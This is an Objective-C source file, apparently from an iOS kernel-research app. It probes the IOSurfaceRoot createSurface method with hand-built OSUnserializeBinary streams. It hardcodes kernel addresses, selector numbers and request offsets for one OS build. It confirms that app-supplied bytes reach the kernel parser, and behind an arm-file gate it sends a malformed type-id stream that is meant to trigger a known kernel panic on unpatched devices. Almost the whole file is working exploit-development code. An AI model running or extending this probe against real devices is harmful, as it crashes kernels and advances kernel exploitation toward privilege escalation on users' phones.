//
//  P169OsunserReach.m — OSUnserializeBinary app-bytes reach confirmation (p169).
//  2026-11-16.
//
//  Static base (23F77 hunt, 2026-11-16):
//    OSUnserializeBinary       = 0xfffffff00a4799c4  (PRE-26.7 body — no
//      type-id-table bound on the create path, no null-guard on the class walk)
//    sized dispatcher          = 0xfffffff00a478da4 (0xD4/d3-magic gate)
//    createSurface sMethod     = 0x986c358 — TABLE-RESOLVED: sel 0
//      (sMethods run base 0x7f33888; second registration sel 60 @0x7f341e8;
//       sel 16 = 0x986ca80, sel 17 = 0x112477 register, sel 18 = dereg)
//      dispatch {1 scalar in, structIn VARIABLE, structOut 0xc68}
//    request layout: +0x20 parent id (u64; >>32 must be 0)
//                    +0x30 serialized-properties ptr (u64, kernel reads
//                      OUR vm bytes directly), +0x38 u32 length
//                    +0x40 optional shmem descriptor, +0x58 out-sink arg4
//    inner gate: client+0x128 surface count < 0x4000 else 0xe00002be
//    binary record grammar: u32 word = (type<<24)|len; types
//      0 array, 1 set, 2 dict, 3 number, 7 symbol, 8 string, 9 data,
//      A boolean, B back-ref. Binary magic: first byte 0xD4 OR
//      u32 0xd3 00 00 00 little-endian at buf[0].
//  A stream that parses drives the surface create; accept = the size in the
//  dict. All codes logged. The malformed type-id variant is ARM-GATED.
//

#import "P169OsunserReach.h"
#import "LabDeviceProfile.h"
#import "LabLocalTime.h"

#import <Foundation/Foundation.h>
#import <CoreFoundation/CoreFoundation.h>
#import <mach/mach.h>
#import <dlfcn.h>
#import <fcntl.h>
#import <unistd.h>
#import <stdlib.h>
#import <string.h>

typedef mach_port_t io_obj_t;
typedef CFMutableDictionaryRef (*p169_match_t)(const void *);
typedef io_obj_t (*p169_getsvc_t)(mach_port_t, CFDictionaryRef);
typedef kern_return_t (*p169_open_t)(io_obj_t, mach_port_t, uint32_t, mach_port_t *);
typedef kern_return_t (*p169_method_t)(mach_port_t, uint32_t,
                                       const uint64_t *, uint32_t,    /* scalars in */
                                       const void *, uint32_t,        /* struct in  */
                                       uint64_t *, uint32_t *,        /* scalars out*/
                                       void *, uint32_t *);           /* struct out */
typedef CFTypeRef (*p169_getid_t)(CFTypeRef);

#define P169_BUILD @"p169-osunser-reach-v1"

static p169_match_t  sServiceMatching;
static p169_getsvc_t sGetService;
static p169_open_t   sOpen;
static p169_method_t sMethod;
static int (*s_vm_copy)(mach_port_t, void *, mach_vm_size_t, const void **, mach_port_t **, uint32_t *) __unused;

static const char *kRoot = "IOSurfaceRoot";

static BOOL p169_armPresent(void) {
    NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory,
                                                          NSUserDomainMask, YES) firstObject];
    return [[NSFileManager defaultManager] fileExistsAtPath:
            [docs stringByAppendingPathComponent:@"p169_arm.txt"]];
}

/* --- binary stream builders (best-effort grammar; codes are the receipt) --- */

/* well-formed minimal: OSCDictionary{kIOSurfaceWidth: uint 0x100} */
static void p169_buildGoodStream(NSMutableData *out) {
    /* header: u32 0xd3 00 00 00 (little-endian) */
    uint32_t magic = 0x000000d3;
    [out appendBytes:&magic length:4];
    /* dict record: type 2, length = number of (key,value) pairs? The exact
       length semantics are v1-guessed: emit 4-byte word (type 2, len 1),
       then key: symbol record (type 7, len bytes) "IOSurfaceWidth",
       then value: number record (type 3, len 4) 0x100 (u32). */
    uint32_t dictWord = (2u << 24) | 1u;
    [out appendBytes:&dictWord length:4];
    const char *key = "IOSurfaceWidth";
    uint32_t keyWord = (7u << 24) | (uint32_t)strlen(key);
    [out appendBytes:&keyWord length:4];
    [out appendBytes:key length:strlen(key)];
    uint32_t numWord = (3u << 24) | 4u;
    [out appendBytes:&numWord length:4];
    int32_t v = 0x100;
    [out appendBytes:&v length:4];
}

/* malformed type-id stream (ARM-GATED): the 26.7-fix crash shape */
static void p169_buildBadStream(NSMutableData *out) {
    uint32_t magic = 0x000000d3;
    [out appendBytes:&magic length:4];
    uint32_t bad = (0x3fu << 24) | 0u;   /* type 0x3f = far beyond the table */
    [out appendBytes:&bad length:4];
    uint32_t tail = 0;
    [out appendBytes:&tail length:4];
}

/* --- request buffer: the createSurface request --- */
static void p169_fillRequest(uint8_t *req, size_t rlen, uint64_t serializedPtr,
                             uint32_t serializedLen) {
    memset(req, 0, rlen);
    /* parent at +0x20 = 0 (high32 must be 0; 0 = no parent) */
    /* serialized-properties pointer at +0x30, length +0x38 */
    memcpy(req + 0x30, &serializedPtr, sizeof(serializedPtr));
    memcpy(req + 0x38, &serializedLen, sizeof(serializedLen));
}

static void p169_disk_log(NSString *out) {
    NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    int fd = open([docs stringByAppendingPathComponent:@"p169_osunser_log.txt"].fileSystemRepresentation,
                  O_CREAT | O_WRONLY | O_TRUNC, 0644);
    if (fd >= 0) {
        const char *c = out.UTF8String;
        if (c) { write(fd, c, strlen(c)); fcntl(fd, F_FULLFSYNC); }
        close(fd);
    }
}

@implementation P169OsunserReach

+ (NSString *)tap {
    NSMutableString *o = [NSMutableString string];
    [o appendFormat:@"=== p169 session %@ BUILD %@ ===\n", LabLocalMilitaryNow(), P169_BUILD];
    [o appendString:[LabDeviceProfile identBlock]];
    [o appendString:@"OSUnserializeBinary app-bytes reach (23F77 PRE-26.7 body live).\n"];
    [o appendString:@"createSurface = sel 0 (table run 0x7f33888; second reg sel 60).\n"];
    [o appendString:@"req+0x30 = RAW serialized stream (kernel reads our vm bytes).\n"];
    [o appendString:@"S-B malformed type-id = ARM-GATED (PANIC-POSSIBLE, pre-fix body).\n"];

    void *h = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
    void *dd = h ? h : RTLD_DEFAULT;
    sServiceMatching = (p169_match_t)dlsym(dd, "IOServiceMatching");
    sGetService      = (p169_getsvc_t)dlsym(dd, "IOServiceGetMatchingService");
    sOpen            = (p169_open_t)dlsym(dd, "IOServiceOpen");
    sMethod          = (p169_method_t)dlsym(dd, "IOConnectCallMethod");
    [o appendFormat:@"  [lib] iokit=%@ matching=%d getservice=%d open=%d method=%d\n",
        h ? @"ok" : @"MISSING", sServiceMatching != NULL, sGetService != NULL,
        sOpen != NULL, sMethod != NULL];
    if (!sOpen || !sMethod || !sGetService || !sServiceMatching) {
        [o appendString:@"[-] symbols missing — probe dead\n"]; return o;
    }

    CFMutableDictionaryRef m = sServiceMatching(kRoot);
    io_obj_t svc = sGetService(0, m);
    /* 2026-11-20 crash receipt (P007OpenOnly-203826: EXC_BREAKPOINT in CFRelease
       from this tap): same double-release as P168/P172 — IOServiceGetMatchingService
       CONSUMES the dict. Fix: m = NULL after the consume. */
    m = NULL;   /* consumed by sGetService above */
    mach_port_t conn = 0;
    kern_return_t kr = svc ? sOpen(svc, mach_task_self(), 0, &conn) : 0xe00002eb;
    [o appendFormat:@"  [open] svc=%#x open=%#x conn=%#x\n",
        (unsigned)(uintptr_t)svc, (unsigned)kr, (unsigned)conn];
    if (kr != KERN_SUCCESS || !conn) {
        [o appendString:@"[-] no IOSurfaceRoot connect\n"]; return o;
    }

    /* the request: 0x80 bytes; structOut 0xc68 per the dispatch row */
    const size_t kReq = 0x80;
    const uint32_t kOutC = 0xc68;
    uint8_t *req = (uint8_t *)calloc(1, kReq);
    uint8_t *out = (uint8_t *)calloc(1, kOutC);
    uint32_t outn = kOutC;
    uint64_t scalIn[1] = {0}; uint32_t scalInN = 1;
    uint64_t scalOut[2] = {0,0}; uint32_t scalOutN = 2;

    /* S-A: well-formed binary stream */
    NSMutableData *good = [NSMutableData data];
    p169_buildGoodStream(good);
    void *gbuf = calloc(1, good.length);
    memcpy(gbuf, good.bytes, good.length);
    p169_fillRequest(req, kReq, (uint64_t)(uintptr_t)gbuf, (uint32_t)good.length);
    outn = kOutC;
    void *oobOut = NULL; uint32_t oobN = 0;
    (void)oobOut; (void)oobN;
    kr = sMethod(conn, 0, scalIn, scalInN, req, (uint32_t)kReq,
                 scalOut, &scalOutN, out, &outn);
    [o appendFormat:@"  [S-A good] len=%zu kr=%#x scalOut=%llu scalOutN=%u out[0..7]=%016llx\n",
        (size_t)good.length, (unsigned)kr,
        (unsigned long long)scalOut[0], scalOutN,
        (unsigned long long)out ? *(unsigned long long *)out : 0ull];
    [o appendString:@"      (kr=0 + nonzero result qword = RAW CHANNEL LIVE — the\n"
                     "       parser accepted app bytes the framework never built)\n"];
    free(gbuf);

    /* S-B: malformed type-id (ARM-GATED) */
    if (!p169_armPresent()) {
        [o appendString:@"  [S-B] p169_arm.txt ABSENT — malformed-type stage SKIPPED\n"
                         "[*] arm = ARMORY toggle (or create Documents/p169_arm.txt) + fresh boot + ONE tap\n"];
    } else {
        NSMutableData *bad = [NSMutableData data];
        p169_buildBadStream(bad);
        void *bbuf = calloc(1, bad.length);
        memcpy(bbuf, bad.bytes, bad.length);
        memset(req, 0, kReq);
        p169_fillRequest(req, kReq, (uint64_t)(uintptr_t)bbuf, (uint32_t)bad.length);
        scalOutN = 2;
        kr = sMethod(conn, 0, scalIn, scalInN, req, (uint32_t)kReq,
                     scalOut, &scalOutN, out, &outn);
        [o appendFormat:@"  [S-B ARMED type=0x3f] kr=%#x (survived = type-id walk is\n"
                         "      guarded on THIS boot; panic = the PRE-FIX body's crash shape)\n",
            (unsigned)kr];
        free(bbuf);
    }

    free(req); free(out);
    {
        kern_return_t (*rel)(io_obj_t) = (kern_return_t (*)(io_obj_t))dlsym(dd, "IOObjectRelease");
        if (svc && rel) rel(svc);
    }
    [o appendString:@"=== p169 done (one tap per force-quit) ===\n"];
    p169_disk_log(o);
    return o;
}

@end
